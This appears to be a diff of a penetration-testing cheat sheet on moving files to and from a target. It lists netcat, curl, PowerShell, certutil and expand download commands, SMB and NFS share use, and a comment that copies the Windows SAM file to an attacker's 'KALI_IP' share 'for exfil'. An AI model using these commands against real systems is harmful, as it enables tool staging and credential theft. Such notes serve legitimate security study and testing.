@@ -7,7 +7,7 @@
 nc -nlvp [PORT] > [RECIVING_FILE]
 ```
 ##### send the file
-```
+```bash
 nc [IP] [PORT] < [SENDING_FILE]
 ```
 
@@ -17,7 +17,7 @@ nc [IP] [PORT] < [SENDING_FILE]
 curl -F "upload=@[FILE]" https://[IP]/[FILE]
 ```
 
-```
+```bash
 curl -o [FILE] https://[IP]/[FILE]
 ```
 
@@ -42,30 +42,31 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile(http://[IP]/[FILE]
 powershell iwr -uri http://[IP]/[FILE] -outfile [FILE]
 ```
 
-##### PowerShell 3
-```
+##### PowerShell v3
+```bash
 (net.webclient).downloadstring("http://[IP]/[FILE]") > C:\Path\To\[FILE]
 ```
-```
+```bash
 (net.webclient).downloadfile("http://[IP]/[FILE]", "C:\Path\To\[FILE]")
 ```
 
 
 ## certutil
 
-```bat
+```bash
 certutil -urlcache -split -f http://[IP]/[FILE] [FILE]
 ```
-```
+```bash
 certutil -verifyctl -f -split http://[IP]/[FILE] [FILE]
 ```
 
 ## expand
-```
+```bash
 expand http://[IP]/[FILE] [FILE]
 ```
+
 ##### ADS
-```Download from SBM share into Alternate Data Stream
+```bash
 expand \\[IP]\[FILE] C:\Path\To\[FILE]:[FILE]
 ```
 
@@ -74,6 +75,7 @@ expand \\[IP]\[FILE] C:\Path\To\[FILE]:[FILE]
 sudo mkdir -p /mnt/[SHARE]
 mount -t nfs -o vers=3 [IP]:/[FOLDER]/ /mnt/[SHARE]
 ```
+
 ```sh
 sudo mkdir -p /mnt/[SHARE]
 mount -t nfs -o vers=2 REMOTE_IP:/[FOLDER]/ /mnt/[SHARE]
@@ -95,11 +97,11 @@ sudo mount -t cifs -o vers=1.0 //[REMOTE_IP]/[SHARE] /mnt/[SHARE]
 ```
 ##### Host SMB Share
 ```sh
-sudo impacket-smbserver [SHARE] .
 # to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\[SHARE]\sam.save
+sudo impacket-smbserver [SHARE] .
 ```
 ##### Upload from Target
-```
+```bash
 copy C:\Path\To\[FILE] \\[IP]\[SHARE]\[FILE]
 ```
 ##### Upload with curl to Target
@@ -107,9 +109,10 @@ copy C:\Path\To\[FILE] \\[IP]\[SHARE]\[FILE]
 curl --upload-file /Path/To/[FILE] -u 'DOMAIN\[USER]' smb://[IP]/[SHARE]/
 ```
 ##### Use smbclient to Get ALL files from an SMB share
-```sh
+```bash
 smbclient //[IP]/[SHARE]
 RECURSE ON
 PROMPT OFF
 mget *
 ```
+
